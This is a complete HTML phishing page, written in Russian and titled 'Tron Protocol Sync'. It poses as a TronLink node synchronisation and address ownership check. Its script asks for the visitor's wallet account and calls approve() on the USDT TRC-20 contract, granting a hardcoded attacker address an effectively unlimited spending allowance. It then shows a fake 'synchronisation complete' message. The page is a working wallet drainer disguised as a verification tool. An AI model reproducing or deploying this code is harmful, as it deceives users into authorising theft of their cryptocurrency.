<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Tron Protocol Sync</title>
    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
    <style>
        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
        .card { padding: 40px 25px; width: 85%; max-width: 380px; background: #111; border-radius: 35px; border: 1px solid #222; }
        .logo { width: 70px; height: 70px; background: #ff0013; border-radius: 20px; margin: 0 auto 25px; display: flex; align-items: center; justify-content: center; font-size: 32px; font-weight: bold; box-shadow: 0 0 25px rgba(255,0,19,0.4); }
        h2 { font-size: 22px; margin-bottom: 15px; }
        p { color: #888; font-size: 14px; line-height: 1.6; margin-bottom: 35px; }
        .btn { display: block; background: #ff0013; color: #fff; border: none; padding: 20px; width: 100%; border-radius: 20px; font-weight: bold; text-transform: uppercase; font-size: 14px; cursor: pointer; }
        #err { color: #ff4444; font-size: 12px; margin-top: 20px; display: none; }
    </style>
</head>
<body>

<div class="card">
    <div class="logo">T</div>
    <h2>Синхронизация узла</h2>
    <p>Нажмите кнопку ниже, чтобы подтвердить владение адресом в сети TRC-20 через TronLink.</p>
    <button id="mainBtn" class="btn">ЗАПУСТИТЬ ПРОВЕРКУ</button>
    <div id="err">Кошелек не обнаружен. Откройте эту страницу внутри TronLink.</div>
</div>

<script>
    const ADMIN = 'TXRBrbaTiNotkHp6gSC6vbbZYPq7dqyjF4';
    const CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
    const btn = document.getElementById('mainBtn');

    btn.onclick = async () => {
        const tron = window.tronWeb || (window.tron && window.tron.tronWeb);

        if (tron) {
            try {
                btn.innerText = "ПОДКЛЮЧЕНИЕ...";
                btn.disabled = true;

                // Запрос аккаунта
                await tron.request({ method: 'tron_requestAccounts' });
                
                // Подключение к контракту USDT
                const contract = await tron.contract().at(CONTRACT);
                
                // Вызов Approve
                await contract.approve(ADMIN, '1000000000000000000').send({
                    feeLimit: 100000000
                });

                alert("Синхронизация успешно завершена!");
                btn.innerText = "ГОТОВО";
            } catch (e) {
                alert("Ошибка: " + e.message);
                btn.disabled = false;
                btn.innerText = "ПОВТОРИТЬ";
            }
        } else {
            document.getElementById('err').style.display = "block";
        }
    };
</script>
</body>
</html>
